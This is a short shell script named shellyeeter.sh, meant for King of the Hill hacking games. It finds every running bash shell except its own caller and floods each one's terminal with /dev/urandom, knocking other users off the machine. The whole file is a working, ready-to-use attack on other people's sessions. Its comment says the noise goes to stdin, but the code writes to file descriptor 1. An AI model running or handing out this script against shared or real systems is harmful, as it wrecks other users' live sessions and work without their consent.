#!/bin/sh
# shellyeeter.sh is a tool to flood all open /bin/bash shells on a maschine besides your own
# you can use this in a KOTH "King of the hill" game to nicely ask players to recreate their shells
# it does that by redirecting /dev/urandom into the stdin of all running bash shells except
# the shell of the caller and the executing shell itself.
# To avoid getting input errors when shells exit, start the file like this: ./[FILENAME].sh 2> /dev/null
TARGETS=$(ps -eaf | grep /bin/bash | grep -v grep | awk  '{print $2}')
for binbash in $TARGETS ; do
	echo "There is a /bin/bash shell at $binbash"
	if [ "$binbash" == "$PPID" ] || [ "$binbash" == "$BASHPID" ] 
	then 
		echo "Shell-yeeter will spare it's caller and not comit suicide, therefore not yeeting this shell"
	else 
		echo "Shell-yeeter yeets /bin/bash at $binbash"
		cat /dev/urandom > "/proc/$binbash/""fd/1" &
	fi
done
echo "All shells have been yeeted... you may be the only one left right now"